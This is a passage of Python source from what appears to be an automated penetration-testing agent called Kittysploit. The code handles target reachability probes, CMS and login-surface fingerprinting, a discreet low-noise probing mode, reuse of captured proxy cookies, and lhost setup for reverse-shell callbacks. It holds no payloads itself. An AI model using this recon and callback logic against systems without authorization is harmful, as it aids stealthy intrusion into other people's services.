            if int(active_summary.get("analyzed_flows", 0) or 0) > 0:
                summary = self._http_intel.merge_intel_summaries(summary, active_summary)
                self._merge_http_request_intel_into_kb(state, summary)

        if int(summary.get("analyzed_flows", 0) or 0) <= 0:
            return active_results

        print_status(
            "HTTP request intelligence: "
            f"{summary.get('analyzed_flows', 0)} flow(s), "
            f"{len(summary.get('discovered_endpoints', []) or [])} endpoint(s), "
            f"{len(summary.get('discovered_params', []) or [])} param(s)"
        )
        if getattr(state, "reuse_proxy_auth", False) and summary.get("auth_context"):
            print_info("HTTP request intelligence: captured Cookie context is available for modules.")
        if getattr(state, "verbose", False):
            top = summary.get("interesting_requests", []) or []
            for row in top[:5]:
                print_info(
                    f"- {row.get('method')} {row.get('path')} "
                    f"status={row.get('status_code')} reasons={', '.join(row.get('reasons', [])[:3])}"
                )
        self._append_timeline_event(
            state,
            "request-intel",
            (
                f"Imported {summary.get('analyzed_flows', 0)} KittyProxy flow(s), "
                f"{len(summary.get('interesting_requests', []) or [])} interesting request(s)."
            ),
            kind="analysis",
            extra={
                "endpoints": len(summary.get("discovered_endpoints", []) or []),
                "params": len(summary.get("discovered_params", []) or []),
                "replay_mode": getattr(state, "http_replay", "safe"),
            },
        )
        return active_results + self._run_http_request_replay(state, summary)

    def _is_network_error_result(self, result: Any) -> bool:
        if not isinstance(result, dict):
            return False
        blob = " ".join([
            str(result.get("message", "")),
            str(result.get("status", "")),
            str(result.get("error", "")),
            str(result.get("details", "")),
        ]).lower()
        return any(marker in blob for marker in self._network_error_markers())

    @staticmethod
    def _hostname_is_osint_domain(hostname: str) -> bool:
        """True when *hostname* looks like a DNS name (not a bare IP)."""
        host = str(hostname or "").strip().lower().strip(".")
        if host.startswith("www."):
            host = host[4:]
        if not host or "." not in host:
            return False
        try:
            ipaddress.ip_address(host)
            return False
        except ValueError:
            return True

    _LIVE_TARGET_OSINT_MARKERS: Tuple[str, ...] = (
        "domain_surface_mapper",
        "web_surface_harvester",
        "js_endpoint_extractor",
        "js_sourcemap_analyzer",
        "openapi_swagger_finder",
        "favicon_http_fingerprint",
        "url_headers",
        "webhook_api_leak",
        "hidden_metadata_hunter",
        "secret_leak_access_validator",
    )

    def _unreachable_target_module_skip_reason(
        self,
        state: AgentState,
        module_path: Any,
    ) -> str:
        if state.target_reachable is not False:
            return ""
        path = str(module_path or "").lower()
        stop_reason = str(state.campaign_stop_reason or "")
        if stop_reason == "target_unreachable_passive_only" and "/osint/" in path:
            if any(token in path for token in self._LIVE_TARGET_OSINT_MARKERS):
                return "target unreachable: skipping live HTTP OSINT module"
            return ""
        if "/scanner/" in path or "crawler" in path or "/auxiliary/scanner/" in path:
            return "target unreachable: skipping active scan module"
        if "/osint/" in path and not self._hostname_is_osint_domain(
            str((state.target_info or {}).get("hostname", "") or "")
        ):
            return "target unreachable: OSINT requires a domain target"
        return "target unreachable: skipping target-facing module"

    def _probe_target_reachability(self, state: AgentState) -> Tuple[bool, str]:
        target_info = state.target_info or {}
        host = str(target_info.get("hostname", "") or "").strip()
        scheme = str(target_info.get("scheme", "http") or "http").lower()
        port = int(target_info.get("port", 443 if scheme == "https" else 80) or (443 if scheme == "https" else 80))
        path = str(target_info.get("path", "") or "").strip() or "/"

        if not host:
            return False, "Missing target hostname."

        try:
            with socket.create_connection((host, port), timeout=2.5):
                pass
        except OSError as exc:
            return False, f"{host}:{port} unreachable: {exc}"

        if scheme not in ("http", "https"):
            return True, f"TCP port {port} reachable."

        url = f"{scheme}://{host}:{port}{path if path.startswith('/') else '/' + path}"
        row = self._http_probe_many(state, [url], timeout_s=4, read_bytes=2048)[0]
        if row.get("error"):
            return False, f"HTTP probe failed for {url}: {row.get('error')}"
        status = int(row.get("status") or 0)
        if self._result_waf_signal({
            "status_code": status,
            "body": row.get("body", ""),
            "details": row.get("headers", {}),
        }):
            self._record_waf_signals_from_results(state, [{
                "status_code": status,
                "body": row.get("body", ""),
                "details": row.get("headers", {}),
            }], "reachability-probe")
        return True, f"HTTP probe reached target and returned status {status}."

    def _run_ultra_fingerprint_pass(self, state: AgentState) -> None:
        if state.target_reachable is False:
            return
        target_info = state.target_info or {}
        kb = state.knowledge_base
        if not target_info or not isinstance(kb, dict):
            return

        scheme = str(target_info.get("scheme", "http")).lower()
        host = str(target_info.get("hostname", "")).strip()
        port = int(target_info.get("port", 80))
        if not host:
            return
        base_url = f"{scheme}://{host}:{port}"

        probe_limit = 10 if not self._discreet_mode(state) else 5
        probe_paths, probe_tier = self._resolve_active_probe_paths_for_state(
            state,
            limit=probe_limit,
        )
        if self._discreet_mode(state):
            allowed = {"/", "/robots.txt", "/sitemap.xml", "/login", "/health"}
            probe_paths = [p for p in probe_paths if p in allowed][:5]
        if "/" in probe_paths:
            probe_paths = ["/"] + [p for p in probe_paths if p != "/"]
        if probe_tier == "shell" and "/?rest_route=/" not in probe_paths:
            probe_paths = list(probe_paths) + ["/?rest_route=/"]
            probe_paths = probe_paths[:probe_limit]
        probe_results = []
        tech_hints = set([str(x).lower() for x in kb.get("tech_hints", [])])
        endpoints = set(kb.get("discovered_endpoints", []))
        params = set(kb.get("discovered_params", []))
        login_paths = set(kb.get("login_paths", []))
        risk_signals = set(kb.get("risk_signals", []))
        fingerprint_blobs = []

        urls = [f"{base_url}{path}" for path in probe_paths[:10]]
        probe_rows = self._http_probe_many(state, urls, timeout_s=4, read_bytes=8192)
        baseline_body = ""
        fingerprint_bodies: List[Dict[str, Any]] = []
        for path, row in zip(probe_paths[:10], probe_rows):
            if row.get("error"):
                continue
            status = int(row.get("status") or 0)
            headers = row.get("headers", {}) if isinstance(row.get("headers"), dict) else {}
            body = str(row.get("body", "") or "")
            try:
                final_url_path = urllib.parse.urlparse(str(row.get("final_url", "") or "")).path or ""
            except Exception:
                final_url_path = ""

            if path in {"/", ""} and body:
                baseline_body = body
            fingerprint_bodies.append({"path": path, "status": status, "body": body[:12000]})

            dead_probe = HttpRequestIntelligence._is_dead_http_probe(
                status,
                body,
                response_headers=headers,
            )
            spa_mirror = (
                bool(baseline_body)
                and path not in {"/", ""}
                and status in {200, 204}
                and self._bodies_look_like_spa_catchall(baseline_body, body)
            )
            if spa_mirror:
                dead_probe = True

            if self._result_waf_signal({"status_code": status, "body": body, "details": headers}):
                risk_signals.add("waf_or_blocking_detected")

            blob = f"{path} {headers} {body}".lower()
            fingerprint_blobs.append(blob)
            probe_results.append({
                "path": path,
                "status": status,
                "location": str(headers.get("location", ""))[:200],
                "final_path": final_url_path[:200],
                "dead": bool(dead_probe),
            })
            if not dead_probe:
                for endpoint in self._extract_endpoint_candidates(blob):
                    endpoints.add(endpoint)
                for param in self._extract_param_candidates(blob):
                    params.add(param)

            if not dead_probe and any(m in blob for m in WORDPRESS_BODY_FINGERPRINT_TOKENS):
                tech_hints.add("wordpress")
                self._update_tech_confidence(kb, "wordpress", 0.22)
            if not dead_probe and self._wordpress_probe_signal(
                path,
                status,
                body,
                final_url_path,
                headers.get("location", ""),
            ):
                tech_hints.add("wordpress")
                self._update_tech_confidence(kb, "wordpress", 0.18)
            if not dead_probe and any(m in blob for m in DRUPAL_BLOB_MARKERS):
                tech_hints.add("drupal")
                self._update_tech_confidence(kb, "drupal", 0.25)
            if not dead_probe and any(m in blob for m in JOOMLA_BLOB_MARKERS):
                tech_hints.add("joomla")
                self._update_tech_confidence(kb, "joomla", 0.25)
            if not dead_probe and (any(m in blob for m in DVWA_BLOB_MARKERS) or "dvwa" in blob):
                tech_hints.add("dvwa")
                self._update_tech_confidence(kb, "dvwa", 0.22)
                # Only invent /dvwa/* when the probe itself is under /dvwa — HTML
                # indexes often link to /dvwa/ even when DVWA is at the web root.
                probe_under_dvwa = (
                    str(path).lower().startswith("/dvwa")
                    or str(final_url_path or "").lower().startswith("/dvwa")
                )
                if probe_under_dvwa:
                    login_paths.add("/dvwa/login.php")
                    endpoints.add("/dvwa/")
                    endpoints.add("/dvwa/login.php")
                elif any(m in blob for m in ("damn vulnerable web application", "dvwa security")):
                    # Root-mounted DVWA (common docker / custom lab layouts).
                    login_paths.add("/login.php")
                    risk_signals.add("login_surface_detected")
                    endpoints.add("/login.php")
            if not dead_probe and "generator" in blob and "wordpress" in blob:
                self._update_tech_confidence(kb, "wordpress", 0.2)

            # Generic auth-surface inference from redirect/login markers.
            location = str(headers.get("location", "")).lower()
            if not dead_probe and status in HTTP_REDIRECT_STATUSES and any(token in location for token in AUTH_PATH_MARKERS):
                risk_signals.add("login_redirect_detected")
                normalized_location = location.split("?", 1)[0] if location.startswith("/") else "/login"
                endpoints.add(normalized_location)
                login_paths.add(normalized_location)
                tech_hints.add("auth_portal")
            final_path_low = str(final_url_path or "").lower()
            normalized_test_path = str(path).split("?", 1)[0].lower()
            # urlopen follows redirects by default: detect login redirects from final URL too.
            if not dead_probe and final_path_low and final_path_low != normalized_test_path and any(
                token in final_path_low for token in AUTH_PATH_MARKERS
            ):
                risk_signals.add("login_redirect_detected")
                risk_signals.add("login_surface_detected")
                endpoints.add(final_path_low)
                login_paths.add(final_path_low)
                tech_hints.add("auth_portal")
            if not dead_probe and ("type=\"password\"" in blob or "type='password'" in blob) and any(
                token in blob for token in ("username", "name=\"user", "name='user", "email")
            ):
                risk_signals.add("login_form_detected")
                tech_hints.add("auth_portal")
                if any(token in path for token in AUTH_PATH_MARKERS):
                    login_paths.add(path)
            if (
                not dead_probe
                and any(token in path for token in AUTH_PATH_MARKERS)
                and status in (200, 301, 302, 401, 403)
            ):
                risk_signals.add("login_surface_detected")
                login_paths.add(path)

            if status in HTTP_STATUS_RISK_SIGNALS:
                risk_signals.add(f"http_status_{status}")

        if probe_results:
            kb["fingerprint_trace"] = probe_results
            kb["fingerprint_bodies"] = fingerprint_bodies[:12]
            self._record_waf_signals_from_results(
                state,
                [
                    {
                        "status_code": row.get("status"),
                        "body": row.get("body", ""),
                        "details": row.get("headers", {}),
                    }
                    for row in probe_rows
                    if isinstance(row, dict)
                ],
                "ultra-fingerprint",
            )
        dynamic_keywords = self._extract_adaptive_keywords(" ".join(fingerprint_blobs))
        for keyword in self._match_keywords_to_catalog(kb, dynamic_keywords):
            tech_hints.add(keyword)
        kb["tech_hints"] = sorted(tech_hints)
        kb["discovered_endpoints"] = sorted(endpoints)[:300]
        kb["discovered_params"] = sorted(params)[:200]
        kb["login_paths"] = sorted(login_paths)[:40]
        kb["risk_signals"] = sorted(risk_signals)
        self._promote_corroborated_web_apps(kb)
        state.knowledge_base = kb

    def _is_loopback_or_unspecified_host(self, value: str) -> bool:
        from core.utils.lhost_resolver import is_loopback_or_unspecified_host

        return is_loopback_or_unspecified_host(value)

    def _resolve_routable_lhost(self, target_host: Any) -> str:
        from core.utils.lhost_resolver import discover_primary_lan_ip, resolve_callback_lhost

        return resolve_callback_lhost(target_host) or discover_primary_lan_ip()

    def _resolve_docker_gateway_lhost(self, target_host: Any, target_port: Any) -> str:
        from core.utils.lhost_resolver import resolve_docker_gateway_for_port

        return resolve_docker_gateway_for_port(target_port)

    def _reverse_callback_diagnostic(self, module_instance, target_info: Optional[Dict[str, Any]]) -> str:
        if getattr(module_instance, "payload_type", None) != "reverse":
            return ""
        if not hasattr(module_instance, "lhost"):
            return ""

        try:
            lhost = str(getattr(module_instance, "lhost", "") or "").strip()
        except Exception:
            lhost = ""
        if not self._is_loopback_or_unspecified_host(lhost):
            return ""

        info = target_info or {}
        scheme = str(info.get("scheme", "http") or "http").strip().lower()
        hostname = str(info.get("hostname", "") or "").strip()
        port = info.get("port")
        port_label = ""
        if port not in (None, ""):
            port_label = f":{port}"
        target_label = f"{scheme}://{hostname}{port_label}" if hostname else "the current target"

        return (
            "Reverse payload still points to a loopback lhost "
            f"({lhost or '127.0.0.1'}) for {target_label}. "
            "If the service is exposed from Docker, WSL, a VM, or another network namespace, "
            "the callback will loop back inside the target instead of reaching Kittysploit."
        )
